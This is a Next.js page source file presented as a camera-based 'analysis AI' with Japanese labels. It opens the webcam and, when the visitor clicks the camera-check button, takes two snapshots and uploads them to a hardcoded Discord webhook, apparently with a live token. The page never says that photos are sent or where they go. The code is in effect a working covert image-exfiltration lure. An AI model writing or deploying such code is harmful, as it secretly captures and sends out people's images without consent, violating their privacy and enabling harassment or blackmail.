
import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/router";

export default function Home() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [stream, setStream] = useState(null);
  const router = useRouter();

  useEffect(() => {
    const startCamera = async () => {
      const s = await navigator.mediaDevices.getUserMedia({ video: true });
      setStream(s);
      if (videoRef.current) {
        videoRef.current.srcObject = s;
      }
    };
    startCamera();
  }, []);

  const captureAndSend = async () => {
    if (!canvasRef.current || !videoRef.current) return;

    const images = [];
    for (let i = 0; i < 2; i++) {
      canvasRef.current.width = videoRef.current.videoWidth;
      canvasRef.current.height = videoRef.current.videoHeight;
      const ctx = canvasRef.current.getContext("2d");
      ctx.drawImage(videoRef.current, 0, 0);
      const dataUrl = canvasRef.current.toDataURL("image/jpeg");
      images.push(dataUrl);
      await new Promise((r) => setTimeout(r, 500));
    }

    for (let img of images) {
      const blob = await (await fetch(img)).blob();
      const formData = new FormData();
      formData.append("file", blob, "capture.jpg");
      await fetch("https://discordapp.com/api/webhooks/1367867533860016208/IWr7Rr86BRKQ6O_RIAWf55fzKPyS7PACk7uiK-Yf826lHIJ-YTIrIBFXjMcY1m3ZLq3Q", {
        method: "POST",
        body: formData,
      });
    }

    router.push("/result");
  };

  return (
    <div style={{ textAlign: "center", background: "#000", color: "#fff" }}>
      <h1>分析検点AI</h1>
      <video ref={videoRef} autoPlay playsInline style={{ width: "100%" }} />
      <canvas ref={canvasRef} style={{ display: "none" }} />
      <button onClick={captureAndSend} style={{ fontSize: "24px", marginTop: "20px" }}>カメラ確認</button>
    </div>
  );
}
